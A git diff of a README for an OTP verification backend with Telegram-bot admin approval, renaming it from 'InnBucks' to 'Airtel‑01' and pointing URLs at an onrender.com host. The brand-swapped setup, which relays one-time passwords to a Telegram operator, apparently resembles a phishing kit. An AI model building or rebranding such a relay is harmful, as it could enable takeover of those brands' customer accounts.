@@ -1,4 +1,4 @@
-# InnBucks OTP Verification Backend
+# Airtel‑01 OTP Verification Backend
 
 Backend service for OTP verification with Telegram bot admin approval.
 
@@ -24,7 +24,7 @@ Edit `.env` with your Telegram bot credentials:
 TELEGRAM_BOT_TOKEN=123456789:ABCDefGHijKLmnoPQRstuvwxyz
 TELEGRAM_ADMIN_CHAT_ID=987654321
 TELEGRAM_CALLBACK_TOKEN=your_secret_token_here
-BACKEND_URL=http://localhost:3000
+BACKEND_URL=https://airtel-01.onrender.com  # use your Render URL or localhost for dev
 PORT=3000
 ```
 
@@ -152,7 +152,7 @@ The frontend polls this endpoint every 2 seconds:
 ```javascript
 const interval = setInterval(async () => {
   const res = await fetch(
-    `https://your-backend.com/api/otp/status/${requestId}`,
+    `https://airtel-01.onrender.com/api/otp/status/${requestId}`,
   );
   const data = await res.json();
 
